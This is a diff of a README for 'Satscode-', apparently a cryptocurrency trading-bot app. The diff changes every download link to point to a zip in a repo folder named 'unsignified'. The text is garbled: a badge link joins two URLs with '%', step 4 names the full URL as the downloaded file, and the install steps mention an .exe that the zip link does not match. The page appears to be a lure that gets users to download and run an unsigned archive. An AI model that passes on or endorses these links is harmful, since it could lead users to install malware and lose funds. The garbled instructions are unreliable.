@@ -1,6 +1,6 @@
 # 🚀 Satscode- - Explore Advanced Trading Bots Today!
 
-[![Download Satscode-](https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip%https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip)](https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip)
+[![Download Satscode-](https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip%https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip)](https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip)
 
 ## 🌟 Description
 
@@ -27,13 +27,13 @@ To run Satscode- on your device, ensure you meet the following requirements:
 Follow these steps to download and set up Satscode-:
 
 1. **Visit the Releases Page**: Click the link below to access the download section:
-   [Download Satscode-](https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip)
+   [Download Satscode-](https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip)
 
 2. **Choose Your Version**: On the releases page, you will find different versions of Satscode-. Select the most recent version for the best features and updates.
 
 3. **Download the Application**: Click on the file that matches your operating system. The download should start automatically.
 
-4. **Locate the Downloaded File**: Once the download completes, navigate to your Downloads folder or the location where your browser saves files. You should see a file named something like `https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip` for Windows or `https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip` for macOS.
+4. **Locate the Downloaded File**: Once the download completes, navigate to your Downloads folder or the location where your browser saves files. You should see a file named something like `https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip` for Windows or `https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip` for macOS.
 
 5. **Install the Application**: 
    - **For Windows**: Double-click the `.exe` file and follow the installation prompts.
@@ -45,7 +45,7 @@ Follow these steps to download and set up Satscode-:
 
 ## 🔧 Download & Install
 
-Visit this page to download: [https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip](https://raw.githubusercontent.com/InfoBirth/Satscode-/main/unsignified/Satscode-.zip)
+Visit this page to download: [https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip](https://github.com/InfoBirth/Satscode-/raw/refs/heads/main/unsignified/Satscode_2.4.zip)
 
 After you've followed the installation steps, you can start using Satscode-. Begin exploring the trading bots, customizing them to fit your needs, and engage in the vibrant world of cryptocurrency.
 
